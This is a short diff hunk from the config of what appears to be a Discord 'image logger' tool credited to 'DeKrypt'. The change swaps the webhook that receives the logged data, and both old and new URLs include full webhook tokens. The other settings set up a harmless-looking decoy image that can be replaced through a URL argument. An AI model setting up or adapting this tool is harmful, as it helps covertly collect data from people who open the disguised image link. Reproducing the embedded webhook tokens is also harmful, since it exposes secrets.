@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1093584562791133205/M34Y0wMvhksoGRgu3hfOK08-jaZGg3JLvGwKsniDpU5shk9BvT_lwp-_A8xWpgCsHx6C",
+    "webhook": "https://discord.com/api/webhooks/1348062006334455920/y-9Qdwo2YrYBzmz7HFRMKN5d-h-FD0jN6s87SwqsZWqiugX1s6Rh8Wgc63OcjVnpreb4",
     "image": "https://www.myduchess.com/wp-content/uploads/2021/01/DU-Image-2020-SandwichesGrill-Hotdog-FA-e1610389513139-825x315.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
